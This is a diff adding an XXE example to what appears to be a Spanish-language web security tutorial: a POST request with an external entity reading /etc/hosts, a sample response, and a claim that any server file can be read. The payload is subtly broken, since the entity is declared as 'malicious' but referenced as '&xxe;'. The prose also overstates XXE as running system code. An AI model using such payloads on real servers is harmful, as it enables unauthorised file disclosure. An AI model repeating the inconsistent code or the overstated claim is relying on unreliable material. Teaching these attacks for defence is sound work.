@@ -1100,6 +1100,38 @@ Este es un ataque similar al anterior con el que podemos lograr hacer el ataque 
 
 Un atacante puede `ejecutar comandos a nivel de sistema` mediante el analizador de sintaxis (parser) de XML. La mayoría de analizadores de sintaxis (parsers) procesan entidades externas de forma predeterminada, por lo que el servidor ejecuta las entidades XML maliciosas como codigo del sistema. 
 
+El siguiente ejemplo muestra como con un `XXE` podemos ver el archivo `/etc/hosts`:
+
+```
+|                    Request                    |
+|-----------------------------------------------|
+| POST http://example.com/xml HTTP/1.1          |
+|                                               |
+| <?xml version="1.0" encoding="ISO-8859-1"?>   |
+| <!DOCTYPE mytype [                            |
+| <!ELEMENT mytype ANY>                         |
+| <!ENTITY malicious SYSTEM                     |
+| "file:///etc/hosts">                          |
+| ]>                                            |
+| <foo>                                         |
+| &xxe;                                         |
+| </foo>                                        |
+```
+
+```
+|                   Response                   |
+|----------------------------------------------|
+| HTTP/1.0 200 OK                              |
+|                                              |
+| IPAddress     Hostname    Alias              |
+| 127.0.0.1   localhost web.mydomain.com       |
+| 208.164.186.1 web.mydomain.com    web        |
+| 208.164.186.2 mail.openna.com mail           |
+| (...)                                        |
+```
+
+Esto e puede hacer con `cualquier archivo` de la máquina víctima donde este hosteada la web.
+
 ### Blin XXE Vulnerability
 
 
